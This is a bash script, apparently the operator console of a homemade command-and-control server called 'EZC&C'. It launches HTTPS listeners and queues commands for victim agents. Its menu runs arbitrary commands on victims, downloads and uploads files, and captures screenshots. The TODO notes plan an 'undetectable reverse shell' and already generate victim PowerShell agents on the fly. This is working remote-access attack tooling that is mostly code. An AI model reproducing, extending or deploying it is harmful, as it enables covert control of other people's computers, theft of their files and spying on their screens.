#!/bin/bash

##########################################
# Simple Command and Control Server
# TODO: Name: 
# EZC&C
# EazyCandC
# EZCnC
# EZcnc
# eZcnC
# Written by: Eric Guillen
###########################################
################
#### SERVER ####
################
# COMPLETE: HTTPS
# COMPLETE: SCREENSHOTS via PUT
# COMPLETE: COMMANDS VIA GET
# TODO: UPLOAD TO VICTIM 
# COMPLETE: DOWNLOAD FROM VICTIM
# COMPLETE: SLEEP VARIABLE CREATED
# TODO: Undetectable reverse shell. 
# COMPLETE: Create Folders (AgentRequirements, ServerRequirements, etc)
# TODO: Port Code fully to Python
# COMPLETE: Generate Victim .ps1 on fly (config.sh)
# COMPLETE: Added custom Port when starting commandServer.sh
# TODO: Better sleep timing based on sleep variable (limit victim calls to server)
# COMPLETE: Server IP is based on system its run from
# TODO: More custom variables for portability
# COMPLETE: Add logging capabilities of output (./Logs/<date-log.txt) - pulled from server.py
###############
#### AGENT ####
###############
# TODO: Cleanup sleep 
# COMPLETE: Generate Victim .ps1 on fly (config.sh)
# COMPLETE: Updated eguiHTTPS to give whatever Port
# TODO: More functionality
#

#################
# Variables
#################
SLEEP="sleep 5"
pwd=`pwd`
cc="./ServerRequirements/cc.js"
#LOG=`date +"%Y%m%d-%H%M"-log.txt`
script="commandServer"
#Declare the number of mandatory args
margs=1


# Create Log
#touch ./Logs/$LOG

# Common functions - BEGIN
function example {
    echo -e "example: $script -p 443"
}

function usage {
    echo -e "usage: $script -p <Port>\n"
}

function help {
  usage
    echo -e "MANDATORY:"
    echo -e "  -p, --port  <Port>       Give a port number"
    echo -e "  -h, --help               Prints this help\n"
  example
}

# Ensures that the number of passed args are at least equals
# to the declared number of mandatory args.
# It also handles the special case of the -h or --help arg.
function margs_precheck {
        if [ $1 ] && [ $1 -lt $margs ]; then
                if [ $1 == "--help" ] || [ $1 == "-h" ]; then
                        help
                        exit
                else
                usage
                        example
                exit 1 # error
                fi
        fi
}

# Ensures that all the mandatory args are not empty
function margs_check {
        if [ $# -lt $margs ]; then
            usage
                example
            exit 1 # error
        elif ! [[ $1 =~ ^[0-9]+$ ]]; then
                echo -e "Sorry not a valid port number"
                usage
                example
        elif [ $1 -lt 1 ] || [ $1 -gt 65535 ]; then
                echo -e "Sorry not a valid port range"
                usage
                example
                exit
        fi
}
# Common functions - END
# Custom functions - BEGIN
# Put here your custom functions
# Custom functions - END
# Main
margs_precheck $# $1

marg0=

# Args while-loop
while [ "$1" != "" ];
do
   case $1 in
   -p  | --port )  shift
                          marg0=$1
                                  ;;
   -h   | --help )        help
                          exit
                          ;;
   *)
                          echo "$script: illegal option $1"
                          usage
                                                  example
                                                  exit 1 # error
                          ;;
    esac
    shift
done

# Pass here your mandatory args for check
margs_check $marg0

# Your Stuff goes here

# Start all the Python server's 
# Start HTTPS Server with given Port Number
python ./ServerRequirements/eguiHTTPS.py $marg0 &>> ./ServerRequirements/log.txt &
python ./ServerRequirements/server.py &


# Clear cc.js
echo "" > $cc

cat BANNER.txt

echo "[*] Getting everything ready.."
echo "[*] Server listening on Port.." $marg0
sleep 5

echo "[*] Let's begin.."
echo ""

# Add help functionality
echo "[+] Type '1' to run a command"
echo "[+] Type '2' to download a file from victim"
echo "[+] Type '3' to upload a file to victim"
echo "[+] Type '4' to take screenshot"
#echo "[+] Type '?' or "help" for a list of the commands again"
echo "[+] Type 'q/Q' to Quit"
echo ""
echo "[!] Press any key to continue.."

# Keyboard while loop
while [ true ] ;
do
	read -t 2 -n 1
	if [ $? = 0 ] ; then
		break ;
	else
		sleep 1
	fi
done

# Main While Loop
while :
do

	echo "[+] Type '1', '2', '3', '4', or 'q/Q'"
	read input;

	# Input 1: COMMAND
	if [[ $input == '1' ]]; then
		echo "[+] What command do you want to run?"
		read input2;
		
		echo $input > $cc
		echo $input2 >> $cc

		echo "[+] Waiting for results.."
		$SLEEP
		echo "[!] Wait for next options.."
		$SLEEP


	# Input 2: DOWNLOAD File from Victim
	elif [[ $input == '2' ]]; then
		echo "[+] What file do you want to download?"
		read input2;
		
		echo $input > $cc
		echo $input2 >> $cc

		echo "[+] Waiting for results.."
		$SLEEP
		echo "[!] Wait for next options.."
		$SLEEP
		mv FILENAME $input2 # Change name from FILENAME (created in eguiHTTPS.py) to real filename
		sleep 2
		echo "[!] $input2 has been downloaded and saved to $pwd/$input2 "

	# Input 3: UPLOAD File to Victim
	elif [[ $input == '3' ]]; then
		echo "[+] What file do you want to upload?"
		read file;
		
		# Put into cc.js
		echo $input > $cc
		echo $file >> $cc

		echo "[+] Uploading file..."
		$SLEEP
		echo "[!] Wait for next options.."
		$SLEEP
		
		echo "[!] Let's make sure it's there.."
		echo "1" > $cc
		echo "dir $file" >> $cc
		$SLEEP
	
	# Input 4: SCREENCAPTURE
	elif [[ $input == '4' ]]; then
		# Put into cc.js
		echo "" > $cc
		$SLEEP
		echo $input > $cc
		echo $input >> $cc
		echo "[+] Performing Screen Capture..."
		sleep 3
		echo "[+] Screen Capture Complete!"
		sleep 1
		echo "[+] Grabbing screen capture..."
		sleep 3
		DATE=`date +"%Y%m%d-%H%M%S"`
		cat screenshot1.bmp | base64 -d > ./Screenshots/screenshot-$DATE.bmp
		sleep 3
		echo "[!] Screencapture saved to $pwd/screenshot.bmp" 
		rm screenshot1.bmp

	
	# QUIT
	elif [[ $input == 'q' ]]; then
		break

	# INCORRECT
	elif [[ $input -ne '1' || $input -ne '2' || $input -ne '3' || $input -ne 'q' || $input -ne 'Q' ]]; then
		echo "[-] Command is wrong.. let's start over"

	else
		echo "[-] Hmm, that's weird"
	fi


done

# Cleanup 
# Once it's all over, kill the python stuff
# The exec 3>&2 and all exec redirects to /dev/null
echo "[!] Cleaning up .."
exec 3>&2 # Clean way to redirect termination to /dev/null
exec 2> /dev/null
pkill -f eguiHTTPS.py
pkill -f server.py 
sleep 5
exec 2>&3 # Goes back to original
echo "[+] Goodbye!"

